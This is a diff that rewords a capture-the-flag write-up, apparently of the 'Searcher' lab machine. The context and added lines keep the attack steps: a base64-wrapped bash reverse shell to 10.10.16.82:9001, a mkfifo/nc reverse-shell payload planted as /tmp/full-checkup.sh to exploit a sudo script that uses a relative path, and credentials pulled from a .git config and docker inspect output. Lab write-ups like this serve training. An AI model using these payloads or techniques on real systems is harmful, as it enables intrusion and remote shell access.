@@ -40,13 +40,11 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Fri Sep 18 13:46:46 2026 -- 1 IP address (1 host up) scanned in 48.17 seconds
 ```
 
-On port 80:
-
-- `searchor 2.4.0`
+Port 80 shows `searchor 2.4.0`.
 
 ---
 #### Searchor
-**Searchor** is a Python library that provides a simple interface for performing web searches programmatically, allowing you to query search engines and retrieve results directly from your Python code.
+**Searchor** is a Python library for performing web searches programmatically — you query a search engine from your own code and get the results straight back.
 
 ---
 
@@ -78,16 +76,15 @@ echo "bash  -c 'bash -i >& /dev/tcp/10.10.16.82/9001 0>&1'" | base64
 
 Gained shell as `svc`
 
-Got a subdomain on `/etc/hosts` (we already got it with ffuf):
+A subdomain showed up in `/etc/hosts` — we'd already found it with ffuf:
 
 ```txt
 gitea.searcher.htb
 ```
 
-Found the **.git** directory on `/var/www/app`:
-- `config` file -> creds for user **cody**
+Found the **.git** directory in `/var/www/app`, and its `config` file held credentials for **cody**.
 
-**Cody** is the host of searcher_site...
+**Cody** is the account behind searcher_site...
 > So **cody** might be the username created by **svc** for the gitea web app
 
 > `cody - jh1usoih2bkjaspwe92` aka `svc - jh1usoih2bkjaspwe92`
@@ -98,38 +95,33 @@ Found the **.git** directory on `/var/www/app`:
 sudo -l
 ```
 
-Can run as sudo -> `/opt/scripts/system-checkup.py`
+We can run it as sudo: `/opt/scripts/system-checkup.py`.
 
 ```sh
 sudo python3 /opt/scripts/system-checkup.py *
 ```
 
-Three options: **docker-ps**, **docker-inspect**, **full-checkup**
+The script offers three actions: **docker-ps**, **docker-inspect**, and **full-checkup**.
 
-`docker-ps` -> acts same as `docker ps`
-
-So `docker-inspect` also works as `docker inspect`:
-
-- Listing docker shows **gitea** running in a **docker container**
-- Inspect it:
+`docker-ps` acts the same as `docker ps`, so `docker-inspect` maps to `docker inspect` as well. Listing the containers shows **gitea** running inside Docker, so we inspect it:
 
 ```sh
 sudo python3 /opt/scripts/system-checkup.py docker-inspect -f 'json' gitea
 ```
 
-**Alternative** - if plain text is not working use the template below:
+**Alternative** — if plain text isn't working, use this template instead:
 
 ```sh
 sudo python3 /opt/scripts/system-checkup.py docker-inspect -f '{{json .}}' gitea
 ```
 
-Got a **Config** in json format which holds the **gitea database password** — probably gitea's administrator:
+The config comes back as JSON and holds the **gitea database password** — presumably gitea's administrator:
 
 > `administrator - yuiu1hoiu4i5ho1uh`
 
-Login as administrator in gitea.
+Log in to gitea as administrator.
 
-Admin has a private repo called `scripts` which holds **system-checkup.py**.
+The admin has a private repo called `scripts` containing **system-checkup.py**.
 
 Reviewing system-checkup.py:
 
@@ -145,10 +137,9 @@ Reviewing system-checkup.py:
 
 ```
 
-- When the **full-checkup** function is called, it executes the **full-checkup.sh** script
-- But it doesn't use the absolute path of the shell script
+When the **full-checkup** action runs it executes the **full-checkup.sh** script — but not through an absolute path.
 
-We can abuse it by dropping a fake script in /tmp.
+We can abuse that by dropping a fake script in `/tmp`.
 
 Payload:
 
@@ -156,9 +147,7 @@ Payload:
 echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.82 9001 >/tmp/f" > /tmp/full-checkup.sh
 ```
 
-Move to the tmp dir and execute the script:
-
-- run it as sudo and a shell lands on the listener
+Change into `/tmp` and run the action as sudo — a shell lands on the listener:
 
 ```sh
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
